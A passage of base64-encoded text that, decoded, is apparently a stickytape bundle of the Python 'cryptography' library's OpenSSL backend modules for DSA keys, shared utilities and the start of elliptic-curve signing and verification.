GYuX2RzYV9jZGF0YSwgcHViX2tleSwgcHJpdl9rZXkpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwdWJfa2V5WzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocHJpdl9rZXlbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIGRzYS5EU0FQcml2YXRlTnVtYmVycyhcclxuICAgICAgICAgICAgcHVibGljX251bWJlcnM9ZHNhLkRTQVB1YmxpY051bWJlcnMoXHJcbiAgICAgICAgICAgICAgICBwYXJhbWV0ZXJfbnVtYmVycz1kc2EuRFNBUGFyYW1ldGVyTnVtYmVycyhcclxuICAgICAgICAgICAgICAgICAgICBwPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwWzBdKSxcclxuICAgICAgICAgICAgICAgICAgICBxPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChxWzBdKSxcclxuICAgICAgICAgICAgICAgICAgICBnPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChnWzBdKSxcclxuICAgICAgICAgICAgICAgICksXHJcbiAgICAgICAgICAgICAgICB5PXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwdWJfa2V5WzBdKSxcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgeD1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQocHJpdl9rZXlbMF0pLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBkc2EuRFNBUHVibGljS2V5OlxyXG4gICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5EU0FwYXJhbXNfZHVwKHNlbGYuX2RzYV9jZGF0YSlcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGRzYV9jZGF0YSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBkc2FfY2RhdGEgPSBzZWxmLl9iYWNrZW5kLl9mZmkuZ2MoXHJcbiAgICAgICAgICAgIGRzYV9jZGF0YSwgc2VsZi5fYmFja2VuZC5fbGliLkRTQV9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHB1Yl9rZXkgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5EU0FfZ2V0MF9rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2RzYV9jZGF0YSwgcHViX2tleSwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwdWJfa2V5WzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHB1Yl9rZXlfZHVwID0gc2VsZi5fYmFja2VuZC5fbGliLkJOX2R1cChwdWJfa2V5WzBdKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5EU0Ffc2V0MF9rZXkoXHJcbiAgICAgICAgICAgIGRzYV9jZGF0YSwgcHViX2tleV9kdXAsIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9iYWNrZW5kLl9kc2FfY2RhdGFfdG9fZXZwX3BrZXkoZHNhX2NkYXRhKVxyXG4gICAgICAgIHJldHVybiBfRFNBUHVibGljS2V5KHNlbGYuX2JhY2tlbmQsIGRzYV9jZGF0YSwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIHBhcmFtZXRlcnMoc2VsZikgLT4gZHNhLkRTQVBhcmFtZXRlcnM6XHJcbiAgICAgICAgZHNhX2NkYXRhID0gc2VsZi5fYmFja2VuZC5fbGliLkRTQXBhcmFtc19kdXAoc2VsZi5fZHNhX2NkYXRhKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZHNhX2NkYXRhICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgZHNhX2NkYXRhLCBzZWxmLl9iYWNrZW5kLl9saWIuRFNBX2ZyZWVcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIF9EU0FQYXJhbWV0ZXJzKHNlbGYuX2JhY2tlbmQsIGRzYV9jZGF0YSlcclxuXHJcbiAgICBkZWYgcHJpdmF0ZV9ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBzZXJpYWxpemF0aW9uLktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fcHJpdmF0ZV9rZXlfYnl0ZXMoXHJcbiAgICAgICAgICAgIGVuY29kaW5nLFxyXG4gICAgICAgICAgICBmb3JtYXQsXHJcbiAgICAgICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtLFxyXG4gICAgICAgICAgICBzZWxmLFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSxcclxuICAgICAgICAgICAgc2VsZi5fZHNhX2NkYXRhLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgc2lnbihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgICAgIGFsZ29yaXRobTogdHlwaW5nLlVuaW9uW2FzeW1fdXRpbHMuUHJlaGFzaGVkLCBoYXNoZXMuSGFzaEFsZ29yaXRobV0sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGRhdGEsIF8gPSBfY2FsY3VsYXRlX2RpZ2VzdF9hbmRfYWxnb3JpdGhtKGRhdGEsIGFsZ29yaXRobSlcclxuICAgICAgICByZXR1cm4gX2RzYV9zaWdfc2lnbihzZWxmLl9iYWNrZW5kLCBzZWxmLCBkYXRhKVxyXG5cclxuXHJcbmNsYXNzIF9EU0FQdWJsaWNLZXkoZHNhLkRTQVB1YmxpY0tleSk6XHJcbiAgICBfa2V5X3NpemU6IGludFxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBiYWNrZW5kOiAiQmFja2VuZCIsIGRzYV9jZGF0YSwgZXZwX3BrZXkpOlxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcbiAgICAgICAgc2VsZi5fZHNhX2NkYXRhID0gZHNhX2NkYXRhXHJcbiAgICAgICAgc2VsZi5fZXZwX3BrZXkgPSBldnBfcGtleVxyXG4gICAgICAgIHAgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5EU0FfZ2V0MF9wcWcoXHJcbiAgICAgICAgICAgIGRzYV9jZGF0YSwgcCwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocFswXSAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9rZXlfc2l6ZSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5CTl9udW1fYml0cyhwWzBdKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fa2V5X3NpemVcclxuXHJcbiAgICBkZWYgcHVibGljX251bWJlcnMoc2VsZikgLT4gZHNhLkRTQVB1YmxpY051bWJlcnM6XHJcbiAgICAgICAgcCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgcSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgZyA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgcHViX2tleSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkRTQV9nZXQwX3BxZyhzZWxmLl9kc2FfY2RhdGEsIHAsIHEsIGcpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocVswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGdbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkRTQV9nZXQwX2tleShcclxuICAgICAgICAgICAgc2VsZi5fZHNhX2NkYXRhLCBwdWJfa2V5LCBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHB1Yl9rZXlbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIGRzYS5EU0FQdWJsaWNOdW1iZXJzKFxyXG4gICAgICAgICAgICBwYXJhbWV0ZXJfbnVtYmVycz1kc2EuRFNBUGFyYW1ldGVyTnVtYmVycyhcclxuICAgICAgICAgICAgICAgIHA9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KHBbMF0pLFxyXG4gICAgICAgICAgICAgICAgcT1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQocVswXSksXHJcbiAgICAgICAgICAgICAgICBnPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChnWzBdKSxcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgeT1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQocHViX2tleVswXSksXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBwYXJhbWV0ZXJzKHNlbGYpIC0+IGRzYS5EU0FQYXJhbWV0ZXJzOlxyXG4gICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5EU0FwYXJhbXNfZHVwKHNlbGYuX2RzYV9jZGF0YSlcclxuICAgICAgICBkc2FfY2RhdGEgPSBzZWxmLl9iYWNrZW5kLl9mZmkuZ2MoXHJcbiAgICAgICAgICAgIGRzYV9jZGF0YSwgc2VsZi5fYmFja2VuZC5fbGliLkRTQV9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBfRFNBUGFyYW1ldGVycyhzZWxmLl9iYWNrZW5kLCBkc2FfY2RhdGEpXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9wdWJsaWNfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZywgZm9ybWF0LCBzZWxmLCBzZWxmLl9ldnBfcGtleSwgTm9uZVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgdmVyaWZ5KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc2lnbmF0dXJlOiBieXRlcyxcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5Vbmlvblthc3ltX3V0aWxzLlByZWhhc2hlZCwgaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGRhdGEsIF8gPSBfY2FsY3VsYXRlX2RpZ2VzdF9hbmRfYWxnb3JpdGhtKGRhdGEsIGFsZ29yaXRobSlcclxuICAgICAgICByZXR1cm4gX2RzYV9zaWdfdmVyaWZ5KHNlbGYuX2JhY2tlbmQsIHNlbGYsIHNpZ25hdHVyZSwgZGF0YSlcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmFja2VuZHMvb3BlbnNzbC91dGlscy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBoYXNoZXNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy51dGlscyBpbXBvcnQgUHJlaGFzaGVkXHJcblxyXG5pZiB0eXBpbmcuVFlQRV9DSEVDS0lORzpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IEJhY2tlbmRcclxuXHJcblxyXG5kZWYgX2V2cF9wa2V5X2Rlcml2ZShiYWNrZW5kOiAiQmFja2VuZCIsIGV2cF9wa2V5LCBwZWVyX3B1YmxpY19rZXkpIC0+IGJ5dGVzOlxyXG4gICAgY3R4ID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9uZXcoZXZwX3BrZXksIGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChjdHggIT0gYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICBjdHggPSBiYWNrZW5kLl9mZmkuZ2MoY3R4LCBiYWNrZW5kLl9saWIuRVZQX1BLRVlfQ1RYX2ZyZWUpXHJcbiAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX1BLRVlfZGVyaXZlX2luaXQoY3R4KVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9kZXJpdmVfc2V0X3BlZXIoY3R4LCBwZWVyX3B1YmxpY19rZXkuX2V2cF9wa2V5KVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgIGtleWxlbiA9IGJhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIilcclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9kZXJpdmUoY3R4LCBiYWNrZW5kLl9mZmkuTlVMTCwga2V5bGVuKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQoa2V5bGVuWzBdID4gMClcclxuICAgIGJ1ZiA9IGJhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIGtleWxlblswXSlcclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9kZXJpdmUoY3R4LCBidWYsIGtleWxlbilcclxuICAgIGlmIHJlcyAhPSAxOlxyXG4gICAgICAgIGVycm9yc193aXRoX3RleHQgPSBiYWNrZW5kLl9jb25zdW1lX2Vycm9yc193aXRoX3RleHQoKVxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkVycm9yIGNvbXB1dGluZyBzaGFyZWQga2V5LiIsIGVycm9yc193aXRoX3RleHQpXHJcblxyXG4gICAgcmV0dXJuIGJhY2tlbmQuX2ZmaS5idWZmZXIoYnVmLCBrZXlsZW5bMF0pWzpdXHJcblxyXG5cclxuZGVmIF9jYWxjdWxhdGVfZGlnZXN0X2FuZF9hbGdvcml0aG0oXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIGFsZ29yaXRobTogdHlwaW5nLlVuaW9uW1ByZWhhc2hlZCwgaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4pIC0+IHR5cGluZy5UdXBsZVtieXRlcywgaGFzaGVzLkhhc2hBbGdvcml0aG1dOlxyXG4gICAgaWYgbm90IGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBQcmVoYXNoZWQpOlxyXG4gICAgICAgIGhhc2hfY3R4ID0gaGFzaGVzLkhhc2goYWxnb3JpdGhtKVxyXG4gICAgICAgIGhhc2hfY3R4LnVwZGF0ZShkYXRhKVxyXG4gICAgICAgIGRhdGEgPSBoYXNoX2N0eC5maW5hbGl6ZSgpXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIGFsZ29yaXRobSA9IGFsZ29yaXRobS5fYWxnb3JpdGhtXHJcblxyXG4gICAgaWYgbGVuKGRhdGEpICE9IGFsZ29yaXRobS5kaWdlc3Rfc2l6ZTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAiVGhlIHByb3ZpZGVkIGRhdGEgbXVzdCBiZSB0aGUgc2FtZSBsZW5ndGggYXMgdGhlIGhhc2ggIlxyXG4gICAgICAgICAgICAiYWxnb3JpdGhtXCdzIGRpZ2VzdCBzaXplLiJcclxuICAgICAgICApXHJcblxyXG4gICAgcmV0dXJuIChkYXRhLCBhbGdvcml0aG0pXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L2JhY2tlbmRzL29wZW5zc2wvZWMucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5leGNlcHRpb25zIGltcG9ydCAoXHJcbiAgICBJbnZhbGlkU2lnbmF0dXJlLFxyXG4gICAgVW5zdXBwb3J0ZWRBbGdvcml0aG0sXHJcbiAgICBfUmVhc29ucyxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC51dGlscyBpbXBvcnQgKFxyXG4gICAgX2NhbGN1bGF0ZV9kaWdlc3RfYW5kX2FsZ29yaXRobSxcclxuICAgIF9ldnBfcGtleV9kZXJpdmUsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IHNlcmlhbGl6YXRpb25cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYyBpbXBvcnQgZWNcclxuXHJcbmlmIHR5cGluZy5UWVBFX0NIRUNLSU5HOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgQmFja2VuZFxyXG5cclxuXHJcbmRlZiBfY2hlY2tfc2lnbmF0dXJlX2FsZ29yaXRobShcclxuICAgIHNpZ25hdHVyZV9hbGdvcml0aG06IGVjLkVsbGlwdGljQ3VydmVTaWduYXR1cmVBbGdvcml0aG0sXHJcbikgLT4gTm9uZTpcclxuICAgIGlmIG5vdCBpc2luc3RhbmNlKHNpZ25hdHVyZV9hbGdvcml0aG0sIGVjLkVDRFNBKTpcclxuICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgIlVuc3VwcG9ydGVkIGVsbGlwdGljIGN1cnZlIHNpZ25hdHVyZSBhbGdvcml0aG0uIixcclxuICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfUFVCTElDX0tFWV9BTEdPUklUSE0sXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmRlZiBfZWNfa2V5X2N1cnZlX3NuKGJhY2tlbmQ6ICJCYWNrZW5kIiwgZWNfa2V5KSAtPiBzdHI6XHJcbiAgICBncm91cCA9IGJhY2tlbmQuX2xpYi5FQ19LRVlfZ2V0MF9ncm91cChlY19rZXkpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGdyb3VwICE9IGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG5cclxuICAgIG5pZCA9IGJhY2tlbmQuX2xpYi5FQ19HUk9VUF9nZXRfY3VydmVfbmFtZShncm91cClcclxuICAgICMgVGhlIGZvbGxvd2luZyBjaGVjayBpcyB0byBmaW5kIEVDIGtleXMgd2l0aCB1bm5hbWVkIGN1cnZlcyBhbmQgcmFpc2VcclxuICAgICMgYW4gZXJyb3IgZm9yIG5vdy5cclxuICAgIGlmIG5pZCA9PSBiYWNrZW5kLl9saWIuTklEX3VuZGVmOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICJFQ0RTQSBrZXlzIHdpdGggZXhwbGljaXQgcGFyYW1ldGVycyBhcmUgdW5zdXBwb3J0ZWQgYXQgdGhpcyB0aW1lIlxyXG4gICAgICAgIClcclxuXHJcbiAgICAjIFRoaXMgaXMgbGlrZSB0aGUgYWJvdmUgY2hlY2ssIGJ1dCBpdCBhbHNvIGNhdGNoZXMgdGhlIGNhc2Ugd2hlcmUgeW91XHJcbiAgICAjIGV4cGxpY2l0bHkgZW5jb2RlZCBhIGN1cnZlIHdpdGggdGhlIHNhbWUgcGFyYW1ldGVycyBhcyBhIG5hbWVkIGN1cnZlLlxyXG4gICAgIyBEb25cJ3QgZG8gdGhhdC5cclxuICAgIGlmIChcclxuICAgICAgICBub3QgYmFja2VuZC5fbGliLkNSWVBUT0dSQVBIWV9JU19MSUJSRVNTTFxyXG4gICAgICAgIGFuZCBiYWNrZW5kLl9saWIuRUNfR1JPVVBfZ2V0X2FzbjFfZmxhZyhncm91cCkgPT0gMFxyXG4gICAgKTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAiRUNEU0Ega2V5cyB3aXRoIGV4cGxpY2l0IHBhcmFtZXRlcnMgYXJlIHVuc3VwcG9ydGVkIGF0IHRoaXMgdGltZSJcclxuICAgICAgICApXHJcblxyXG4gICAgY3VydmVfbmFtZSA9IGJhY2tlbmQuX2xpYi5PQkpfbmlkMnNuKG5pZClcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQoY3VydmVfbmFtZSAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuXHJcbiAgICBzbiA9IGJhY2tlbmQuX2ZmaS5zdHJpbmcoY3VydmVfbmFtZSkuZGVjb2RlKCJhc2NpaSIpXHJcbiAgICByZXR1cm4gc25cclxuXHJcblxyXG5kZWYgX21hcmtfYXNuMV9uYW1lZF9lY19jdXJ2ZShiYWNrZW5kOiAiQmFja2VuZCIsIGVjX2NkYXRhKTpcclxuICAgICIiIlxyXG4gICAgU2V0IHRoZSBuYW1lZCBjdXJ2ZSBmbGFnIG9uIHRoZSBFQ19LRVkuIFRoaXMgY2F1c2VzIE9wZW5TU0wgdG9cclxuICAgIHNlcmlhbGl6ZSBFQyBrZXlzIGFsb25nIHdpdGggdGhlaXIgY3VydmUgT0lEIHdoaWNoIG1ha2VzXHJcbiAgICBkZXNlcmlhbGl6YXRpb24gZWFzaWVyLlxyXG4gICAgIiIiXHJcblxyXG4gICAgYmFja2VuZC5fbGliLkVDX0tFWV9zZXRfYXNuMV9mbGFnKFxyXG4gICAgICAgIGVjX2NkYXRhLCBiYWNrZW5kLl9saWIuT1BFTlNTTF9FQ19OQU1FRF9DVVJWRVxyXG4gICAgKVxyXG5cclxuXHJcbmRlZiBfY2hlY2tfa2V5X2luZmluaXR5KGJhY2tlbmQ6ICJCYWNrZW5kIiwgZWNfY2RhdGEpIC0+IE5vbmU6XHJcbiAgICBwb2ludCA9IGJhY2tlbmQuX2xpYi5FQ19LRVlfZ2V0MF9wdWJsaWNfa2V5KGVjX2NkYXRhKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwb2ludCAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuICAgIGdyb3VwID0gYmFja2VuZC5fbGliLkVDX0tFWV9nZXQwX2dyb3VwKGVjX2NkYXRhKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChncm91cCAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuICAgIGlmIGJhY2tlbmQuX2xpYi5FQ19QT0lOVF9pc19hdF9pbmZpbml0eShncm91cCwgcG9pbnQpOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICJDYW5ub3QgbG9hZCBhbiBFQyBwdWJsaWMga2V5IHdoZXJlIHRoZSBwb2ludCBpcyBhdCBpbmZpbml0eSJcclxuICAgICAgICApXHJcblxyXG5cclxuZGVmIF9zbl90b19lbGxpcHRpY19jdXJ2ZShiYWNrZW5kOiAiQmFja2VuZCIsIHNuOiBzdHIpIC0+IGVjLkVsbGlwdGljQ3VydmU6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgcmV0dXJuIGVjLl9DVVJWRV9UWVBFU1tzbl0oKVxyXG4gICAgZXhjZXB0IEtleUVycm9yOlxyXG4gICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAie30gaXMgbm90IGEgc3VwcG9ydGVkIGVsbGlwdGljIGN1cnZlIi5mb3JtYXQoc24pLFxyXG4gICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9FTExJUFRJQ19DVVJWRSxcclxuICAgICAgICApXHJcblxyXG5cclxuZGVmIF9lY2RzYV9zaWdfc2lnbihcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIiwgcHJpdmF0ZV9rZXk6ICJfRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXkiLCBkYXRhOiBieXRlc1xyXG4pIC0+IGJ5dGVzOlxyXG4gICAgbWF4X3NpemUgPSBiYWNrZW5kLl9saWIuRUNEU0Ffc2l6ZShwcml2YXRlX2tleS5fZWNfa2V5KVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChtYXhfc2l6ZSA+IDApXHJcblxyXG4gICAgc2lnYnVmID0gYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgbWF4X3NpemUpXHJcbiAgICBzaWdsZW5fcHRyID0gYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgaW50W10iLCAxKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVDRFNBX3NpZ24oXHJcbiAgICAgICAgMCwgZGF0YSwgbGVuKGRhdGEpLCBzaWdidWYsIHNpZ2xlbl9wdHIsIHByaXZhdGVfa2V5Ll9lY19rZXlcclxuICAgIClcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICByZXR1cm4gYmFja2VuZC5fZmZpLmJ1ZmZlcihzaWdidWYpWzogc2lnbGVuX3B0clswXV1cclxuXHJcblxyXG5kZWYgX2VjZHNhX3NpZ192ZXJpZnkoXHJcbiAgICBiYWNrZW5kOiAiQmFja2VuZCIsXHJcbiAgICBwdWJsaWNfa2V5OiAiX0VsbGlwdGljQ3VydmVQdWJsaWNLZXkiLFxyXG4gICAgc2lnbmF0dXJlOiBieXRlcyxcclxuICAgIGRhdGE6IGJ5dGVzLFxyXG4pIC0+IE5vbmU6XHJcbiAgICByZXMgPSBiYWNrZW5kLl9saWIuRUNEU0FfdmVyaWZ5KFxyXG4gICAgICAgIDAsIGRhdGEsIGxlbihkYXRhKSwgc2lnbmF0dXJlLCBsZW4oc2lnbmF0dXJlKSwgcHVibGljX2